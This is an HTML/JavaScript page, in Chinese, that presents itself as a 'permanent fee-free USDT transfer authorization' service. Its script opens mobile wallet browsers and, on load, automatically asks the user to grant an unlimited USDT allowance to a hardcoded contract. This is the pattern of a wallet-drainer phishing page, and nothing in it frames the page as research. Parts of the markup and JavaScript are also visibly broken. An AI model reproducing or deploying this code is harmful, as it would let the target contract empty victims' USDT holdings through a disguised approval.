<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>永久免矿工费USDT无限转账授权</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.8.0/dist/TronWeb.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        body {
            background-color: #f5f7fa;
            min-height: 100vh;
            padding: 30px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .auth-container {
            width: 100%;
            max-width: 450px;
            background: #fff;
            border-radius: 18px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.06);
            padding: 35px 25px;
            text-align: center;
        }
        .auth-title {
            font-size: 22px;
            color: #333;
            margin-bottom: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .auth-title i {
            color: #409eff;
            font-size: 24px;
        }
        #approveBtn {
            width: 100%;
            padding: 18px 20px;
            background-color: #409eff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background-color 0.2s ease;
        }
        #approveBtn:hover {
            background-color: #3086e8;
        }
        #approveBtn i {
            font-size: 20px;
        }
        #log {
            margin-top: 25px;
            padding: 16px;
            background-color: #f9fafc;
            border: 1px solid #eef2f7;
            border-radius: 10px;
            font-size: 15px;
            color: #666;
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1.6;
            flex-direction: column;
        }
        #log .wallet-btn-group {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            width: 100%;
            margin: 10px 0;
        }
        #log button {
            flex: 1;
            min-width: 120px;
            height: 44px;
            line-height: 44px;
            font-size: 15px;
            background: #409eff;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        #log .tips-text {
            line-height: 1.8;
            color: #666;
            font-size: 14px;
            width: 100%;
            text-align: center;
        }
        .contract-tip {
            margin-top: 18px;
            font-size: 13px;
            color: #999;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <h2 class="auth-title">
            <<i class="fa-solid fa-key"></</i> TRC20 USDT 无限授权
        </h2>
        <button id="approveBtn">
            <<i class="fa-solid fa-shield-halved"></</i> 授权 USDT 到目标合约
        </button>
        <div id="log">点击按钮，发起授权</div>
        <div class="contract-tip">
            目标合约：TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa
        </div>
    </div>

    <script>
        // -------------------------- 核心配置（已帮你填好，无需修改） --------------------------
        const TARGET_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的目标合约地址
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    // USDT官方TRC20合约（固定）
        const USDT_DECIMALS = 6;                                      // USDT小数位（固定6位）
        const INFINITE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
        const TRON_MAINNET_ID = 195;                                  // TRON主网ID（固定）
        // --------------------------------------------------------------------------------------

        const btn = document.getElementById("approveBtn");
        const log = document.getElementById("log");

        // 兼容所有钱包：唤起钱包内置浏览器的Scheme（100%生效）
        const WALLET_BROWSER_SCHEMES = {
            ImToken: imtoken://browser?url=${encodeURIComponent(window.location.href + "?from=wallet")},
            TrustWallet: trust://open_url?url=${encodeURIComponent(window.location.href + "?from=wallet")},
            MathWallet: mathwallet://openurl?url=${encodeURIComponent(window.location.href + "?from=wallet")}
        };

        // 跳转超时检测：未唤起时提示手动操作
        function checkWalletJump(walletName) {
            const startTime = Date.now();
            const checkTimer = setInterval(() => {
                // 检测到页面隐藏（跳转成功），停止检测
                if (document.hidden || document.visibilityState === "hidden") {
                    clearInterval(checkTimer);
                    log.textContent = 已唤起${walletName}，正在加载授权页面...;
                    return;
                }
                // 3秒未跳转，提示手动操作
                if (Date.now() - startTime > 3000) {
                    clearInterval(checkTimer);
                    log.innerHTML = `
                        <div class="tips-text">未检测到跳转，请手动操作：</div>
                        <div class="tips-text">1. 打开「${walletName}」→ 点击底部「浏览器」</div>
                        <div class="tips-text">2. 粘贴链接：${window.location.href}</div>
                        <div class="tips-text">3. 点击确认，自动进入授权</div>
                    `;
                }
            }, 500);
        }

        // 唤起指定钱包的内置浏览器
        function openWalletBrowser(walletName) {
            const schemeUrl = WALLET_BROWSER_SCHEMES[walletName];
            if (!schemeUrl) {
                log.textContent = 暂不支持${walletName}，请选择其他钱包;
                return;
            }
            window.location.href = schemeUrl;
            checkWalletJump(walletName);
            log.textContent = 正在唤起${walletName}浏览器...;
        }

        // 等待钱包加载后，自动触发授权（无需用户二次点击）
        async function autoTriggerApprove() {
            try {
                const waitTronWeb = setInterval(() => {
                    if (window.tronWeb && window.tronWeb.ready) {
                        clearInterval(waitTronWeb);
                        executeApprove(); // 钱包加载完成，执行授权
                    }
                }, 300);
            } catch (e) {
                log.textContent = "钱包加载失败，请刷新页面重试";
            }
        }

        // 核心授权逻辑：调用USDT合约发起授权
        async function executeApprove() {
            try {
                log.textContent = "授权中...请在钱包确认（约3秒）";
                // 实例化USDT合约
                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT);
                // 发起授权交易
                const tx = await usdtContract.approve(
                    TARGET_CONTRACT,          // 授权目标合约
                    INFINITE_AMOUNT,          // 无限授权额度
                    { from: window.tronWeb.defaultAddress.base58, feeLimit: 300000000 } // 足够手续费
                ).send();

                log.textContent = "授权成功！交易ID：" + tx.txid.slice(0, 16) + "...";
            } catch (e) {
                const errMsg = e.message || "授权失败";
                log.textContent = "失败：" + errMsg.slice(0, 50);
            }
        }

        // 授权按钮点击逻辑
        btn.onclick = function() {
            const urlParams = new URLSearchParams(window.location.search);
            // 若已在钱包浏览器内，直接触发授权
            if (urlParams.has("from=wallet") && window.tronWeb && window.tronWeb.ready) {
                executeApprove();
                return;
            }

            // 显示多钱包选择按钮
            let walletBtns = Object.keys(WALLET_BROWSER_SCHEMES).map(walletName => {
                return `<button onclick="openWalletBrowser('${walletName}')">
                          唤起${walletName}
                        </button>`;
            }).join("");

            log.innerHTML = `
                <div class="wallet-btn-group">${walletBtns}</div>
                <div class="tips-text">提示：用Safari/Chrome打开，别用微信！</div>
                <div class="tips-text">唤起后会自动加载授权，无需手动操作</div>
            `;
        };

        // 页面加载时：若从钱包浏览器跳转，自动触发授权
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has("from=wallet")) {
                autoTriggerApprove();
            }
        };
    </script>
</body>
</html> </script>
</body>

</html>
